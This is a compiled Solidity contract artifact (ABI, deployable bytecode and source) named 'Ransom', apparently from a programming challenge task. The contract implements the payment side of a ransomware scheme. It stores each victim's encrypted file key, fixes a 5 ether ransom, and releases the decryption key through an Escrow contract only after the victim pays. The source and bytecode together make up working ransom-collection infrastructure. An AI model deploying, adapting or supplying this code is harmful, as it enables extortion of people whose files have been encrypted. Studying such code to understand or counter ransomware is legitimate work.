{
  "contractName": "Ransom",
  "abi": [
    {
      "inputs": [
        {
          "name": "_victimId",
          "type": "uint256"
        },
        {
          "name": "_encKey",
          "type": "string"
        },
        {
          "name": "_victimAddr",
          "type": "address"
        },
        {
          "name": "_registryAddr",
          "type": "address"
        },
        {
          "name": "authToken",
          "type": "uint256"
        }
      ],
      "payable": false,
      "stateMutability": "nonpayable",
      "type": "constructor"
    },
    {
      "anonymous": false,
      "inputs": [
        {
          "indexed": false,
          "name": "id",
          "type": "uint256"
        }
      ],
      "name": "AuthFailEvent",
      "type": "event"
    },
    {
      "constant": false,
      "inputs": [
        {
          "name": "_escrowAddr",
          "type": "address"
        },
        {
          "name": "authResult",
          "type": "bool"
        }
      ],
      "name": "authCallback",
      "outputs": [],
      "payable": false,
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "constant": true,
      "inputs": [],
      "name": "getEscrowAddress",
      "outputs": [
        {
          "name": "",
          "type": "address"
        }
      ],
      "payable": false,
      "stateMutability": "view",
      "type": "function"
    },
    {
      "constant": false,
      "inputs": [],
      "name": "requestKey",
      "outputs": [],
      "payable": false,
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "constant": true,
      "inputs": [],
      "name": "getDecryptionKey",
      "outputs": [
        {
          "name": "",
          "type": "bytes32"
        }
      ],
      "payable": false,
      "stateMutability": "view",
      "type": "function"
    },
    {
      "constant": false,
      "inputs": [],
      "name": "fulfillContract",
      "outputs": [],
      "payable": false,
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "constant": true,
      "inputs": [],
      "name": "isAuthenticated",
      "outputs": [
        {
          "name": "",
          "type": "bool"
        }
      ],
      "payable": false,
      "stateMutability": "view",
      "type": "function"
    },
    {
      "constant": true,
      "inputs": [],
      "name": "isFulFilled",
      "outputs": [
        {
          "name": "",
          "type": "bool"
        }
      ],
      "payable": false,
      "stateMutability": "view",
      "type": "function"
    },
    {
      "constant": false,
      "inputs": [],
      "name": "die",
      "outputs": [],
      "payable": false,
      "stateMutability": "nonpayable",
      "type": "function"
    }
  ],
  "bytecode": "0x60806040523480156200001157600080fd5b5060405162001153380380620011538339810180604052810190808051906020019092919080518201929190602001805190602001909291908051906020019092919080519060200190929190505050600080600460146101000a81548160ff02191690831515021790555082600460006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff1602179055506000600360006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff1602179055506000600460156101000a81548160ff0219169083151502179055508560008190555084600190805190602001906200013a929190620002ab565b5083600260006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff160217905550600460009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff166320b6afb3600054846040518363ffffffff167c01000000000000000000000000000000000000000000000000000000000281526004018083815260200182815260200192505050602060405180830381600087803b1580156200021857600080fd5b505af11580156200022d573d6000803e3d6000fd5b505050506040513d60208110156200024457600080fd5b810190808051906020019092919050505090506000151581151514156200029f577f119838572b9a7d1005a0ab4d2ff7800844d2ee0b6687737c106ebb20c5a6546b6000546040518082815260200191505060405180910390a15b5050505050506200035a565b828054600181600116156101000203166002900490600052602060002090601f016020900481019282601f10620002ee57805160ff19168380011785556200031f565b828001600101855582156200031f579182015b828111156200031e57825182559160200191906001019062000301565b5b5090506200032e919062000332565b5090565b6200035791905b808211156200035357600081600090555060010162000339565b5090565b90565b610de9806200036a6000396000f30060806040526004361061008e576000357c0100000000000000000000000000000000000000000000000000000000900463ffffffff16806309c4222114610093578063122fd48a146100e25780632f67b7c51461013957806335f46994146101505780637d6ddcc114610167578063878a0db71461019a578063a4b82523146101b1578063ef67c10f146101e0575b600080fd5b34801561009f57600080fd5b506100e0600480360381019080803573ffffffffffffffffffffffffffffffffffffffff16906020019092919080351515906020019092919050505061020f565b005b3480156100ee57600080fd5b506100f76104b6565b604051808273ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200191505060405180910390f35b34801561014557600080fd5b5061014e6104e0565b005b34801561015c57600080fd5b506101656107b4565b005b34801561017357600080fd5b5061017c61098b565b60405180826000191660001916815260200191505060405180910390f35b3480156101a657600080fd5b506101af610bd6565b005b3480156101bd57600080fd5b506101c6610d8f565b604051808215151515815260200191505060405180910390f35b3480156101ec57600080fd5b506101f5610da6565b604051808215151515815260200191505060405180910390f35b600460009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff161415156102fa576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004018080602001828103825260288152602001807f4f6e6c792074686520526567697374727920636f6e74726163742063616e206381526020017f616c6c207468697300000000000000000000000000000000000000000000000081525060400191505060405180910390fd5b80600460146101000a81548160ff0219169083151502179055506001151581151514156104785781600360006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff160217905550600360009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663444921e6674563918244f40000600054600260009054906101000a900473ffffffffffffffffffffffffffffffffffffffff166040518463ffffffff167c0100000000000000000000000000000000000000000000000000000000028152600401808481526020018381526020018273ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019350505050600060405180830381600087803b15801561045b57600080fd5b505af115801561046f573d6000803e3d6000fd5b505050506104b2565b7f119838572b9a7d1005a0ab4d2ff7800844d2ee0b6687737c106ebb20c5a6546b6000546040518082815260200191505060405180910390a15b5050565b6000600360009054906101000a900473ffffffffffffffffffffffffffffffffffffffff16905090565b60011515600460149054906101000a900460ff161515141515610591576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004018080602001828103825260388152602001807f4f6e6c792076616c6964206966207468652052616e736f6d20636f6e7472616381526020017f7420686173206265656e2061757468656e74696361746564000000000000000081525060400191505060405180910390fd5b600360009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff1614151561067c576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004018080602001828103825260268152602001807f4f6e6c792074686520457363726f7720636f6e74726163742063616e2063616c81526020017f6c2074686973000000000000000000000000000000000000000000000000000081525060400191505060405180910390fd5b600360009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663e078891d60005460016040518363ffffffff167c010000000000000000000000000000000000000000000000000000000002815260040180838152602001806020018281038252838181546001816001161561010002031660029004815260200191508054600181600116156101000203166002900480156107795780601f1061074e57610100808354040283529160200191610779565b820191906000526020600020905b81548152906001019060200180831161075c57829003601f168201915b50509350505050600060405180830381600087803b15801561079a57600080fd5b505af11580156107ae573d6000803e3d6000fd5b50505050565b600360009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff1614151561089f576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004018080602001828103825260268152602001807f4f6e6c792074686520457363726f7720636f6e74726163742063616e2063616c81526020017f6c2074686973000000000000000000000000000000000000000000000000000081525060400191505060405180910390fd5b60011515600460149054906101000a900460ff161515141515610950576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004018080602001828103825260388152602001807f4f6e6c792076616c6964206966207468652052616e736f6d20636f6e7472616381526020017f7420686173206265656e2061757468656e74696361746564000000000000000081525060400191505060405180910390fd5b600360009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16ff5b600060011515600460149054906101000a900460ff161515141515610a3e576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004018080602001828103825260388152602001807f4f6e6c792076616c6964206966207468652052616e736f6d20636f6e7472616381526020017f7420686173206265656e2061757468656e74696361746564000000000000000081525060400191505060405180910390fd5b600260009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff16141515610b03576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040180806020018281038252601d8152602001807f4f6e6c79207468652056696374696d2063616e2063616c6c207468697300000081525060200191505060405180910390fd5b600360009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16634a51ae036000546040518263ffffffff167c010000000000000000000000000000000000000000000000000000000002815260040180828152602001915050602060405180830381600087803b158015610b9657600080fd5b505af1158015610baa573d6000803e3d6000fd5b505050506040513d6020811015610bc057600080fd5b8101908080519060200190929190505050905090565b600360009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff16141515610cc1576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004018080602001828103825260268152602001807f4f6e6c792074686520457363726f7720636f6e74726163742063616e2063616c81526020017f6c2074686973000000000000000000000000000000000000000000000000000081525060400191505060405180910390fd5b60011515600460149054906101000a900460ff161515141515610d72576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004018080602001828103825260388152602001807f4f6e6c792076616c6964206966207468652052616e736f6d20636f6e7472616381526020017f7420686173206265656e2061757468656e74696361746564000000000000000081525060400191505060405180910390fd5b6001600460156101000a81548160ff021916908315150217905550565b6000600460149054906101000a900460ff16905090565b6000600460159054906101000a900460ff169050905600a165627a7a723058209013031ba5dcbc7ebc0705e40df05d5605f68ce55da5b8075735b1b0e63ee4c40029",
  "source": "pragma solidity ^0.4.24;\n\nimport \"./Escrow.sol\";\nimport \"./Registry.sol\";\n\n///@title Ransom contract\ncontract Ransom {\n    /**\n     * @dev This is the Ransom contract that is deployed for each victim. It holds an encrypted\n     * version of the key needed to decrypt the files on the victim machine. The only way to obtain a\n     * copy of the decrypted key is for the victim to pay the ransom. Once the ransom has been paid, the\n     * key may be retrieved through the getDecryptionKey() function.\n     */\n\n    uint victimId;          //!< The unique ID of the victim\n    string encKey;          //!< The key (encrypted) being held ransom (needed to decrypt victim's files)        \n    address victimAddr;     //!< The account address belonging to the victim\n    uint constant RANSOMAMOUNT = 5 ether; //!< The ransom amount the victim must pay\n    address escrowAddr;     //!< The address of the Escrow contract associated with this ransom\n    address registryAddr;   //!< The address of the Registry contract\n    bool authenticated;     //!< Indicates whether this contract has been authenticated with the Escrow\n    bool fulfilled;         //!< Indicates whether the ransom has been fulfilled\n\n    ///@dev The AuthFailEvent is triggered when a problem occurs authenticating with the Escrow contract\n    event AuthFailEvent(\n        uint id             //!< The unique ID of the victim\n    );\n\n    ///@dev Modifier used to restrict the caller to be the Escrow contract\n    modifier restrictSenderToEscrow {\n        require(msg.sender == escrowAddr, \"Only the Escrow contract can call this\");\n        _;\n    }\n\n    ///@dev Modifier used to restrict the caller to be the Registry contract\n    modifier restrictSenderToRegistry {\n        require(msg.sender == registryAddr, \"Only the Registry contract can call this\");\n        _;\n    }\n\n    ///@dev Modifier used to restrict the origin of the transaction to the victim's account\n    modifier restrictSenderToVictim {\n        require(msg.sender == victimAddr, \"Only the Victim can call this\");\n        _;\n    }\n\n    ///@dev Modifier used to restrict calls to once this contract has been authenticated\n    modifier onlyAuthenticated {\n        require(authenticated == true, \"Only valid if the Ransom contract has been authenticated\");\n        _;\n    }\n\n    /**\n     * @dev Ransom constructor\n     * @param _victimId Unique ID of the victim\n     * @param _encKey The encrypted version of the key used to encrypt the victim's files\n     * @param _victimAddr The account address of the victim\n     * @param _registryAddr The address of the Registry contract\n     * @param authToken The one-time authentication code used to authenticate this contract with the Registry\n     */\n    constructor(uint _victimId, string _encKey, address _victimAddr, address _registryAddr, uint authToken) public {\n        authenticated = false;\n        registryAddr = _registryAddr;\n        escrowAddr = address(0);\n        fulfilled = false;\n        victimId = _victimId;\n        encKey = _encKey;\n        victimAddr = _victimAddr;\n\n        // Call registry contract\n        // If the call fails (i.e, too many in queue), then emit an AuthFailEvent\n        bool result = Registry(registryAddr).registerVictim(victimId, authToken);\n        if (result == false) {\n            emit AuthFailEvent(victimId);\n        }\n    }\n\n    /**\n     * @dev Callback function from the Registry contract to indicate whether authentication was successful\n     * @param authResult Indicates whether authentication succeeded    \n     */\n    function authCallback(address _escrowAddr, bool authResult) external restrictSenderToRegistry {\n        authenticated = authResult;\n        if (authResult == true){\n            escrowAddr = _escrowAddr;\n\n            // If authentication was successful, then register with the Escrow contract\n            Escrow(escrowAddr).registerRansom(RANSOMAMOUNT, victimId, victimAddr);\n        } else {\n            emit AuthFailEvent(victimId);\n        }\n    }\n\n    /**\n     * @dev Gets the address of the Escrow contract\n     * @return escrowAddr Address of Escrow contract\n     */\n    function getEscrowAddress() external view returns (address) {\n        return escrowAddr;\n    }\n\n    /**\n     * @dev This function may only be called by the Escrow contract. When the victim pays\n     * the ransom into Escrow, then the Escrow contract will request a copy of the encryption\n     * key to verify that it can successfully decrypt a file provided by the victim. This gives\n     * the victim assurances that they will be given a valid key.\n     */\n    function requestKey() external onlyAuthenticated restrictSenderToEscrow {\n        Escrow(escrowAddr).decryptKey(victimId, encKey);\n    }\n\n    /**\n     * @dev The victim may call this function at any time to get a copy of the decryption key. Note that\n     * the key is provided by the Escrow contract. It will return an empty string until they have payed\n     * the ransom and the key provided by this contract has been successufully used to decrypt a file\n     * provided by the victim. \n     * @return key The encryption key that may be used to decrypt their files (or empty string if ransom\n     * has not been paid)\n     */\n    function getDecryptionKey() external onlyAuthenticated restrictSenderToVictim view returns (bytes32) {\n        return Escrow(escrowAddr).getDecryptionKey(victimId);\n    }\n    \n    /**\n     * @dev This function may only be called by the Escrow contract to indicate that the ransom has been fulfilled.\n     */\n    function fulfillContract() external restrictSenderToEscrow onlyAuthenticated {\n        fulfilled = true;\n    }\n\n    /**\n     * @dev This function may be called by anyone to check if this contract has been authenticated.\n     * @return authenticated Indicates whether the contract has succesfully authenticated with the Registry\n     */\n    function isAuthenticated() external view returns (bool) {\n        return authenticated;\n    }\n\n    /**\n     * @dev This function may be called by anyone to check if this contract has been fulfilled.\n     * @return fulfilled Indicates whether the contract has been fulfilled.\n     */\n    function isFulFilled() external view returns (bool) {\n        return fulfilled;\n    }\n\n    /**\n     * @dev Self-dstructs this contract. May only be called by the Escrow contract\n     */\n    function die() external restrictSenderToEscrow onlyAuthenticated {\n        selfdestruct(escrowAddr);\n    }\n\n}\n",
  "sourcePath": "/Users/vkorolev/Proj/mine/tla/tla-challenge-18/task-6/contracts/Ransom.sol",
  "compiler": {
    "name": "solc",
    "version": "0.4.24+commit.e67f0147.Emscripten.clang"
  },
  "schemaVersion": "3.0.0-beta.1",
  "updatedAt": "2018-12-28T20:58:23.745Z"
}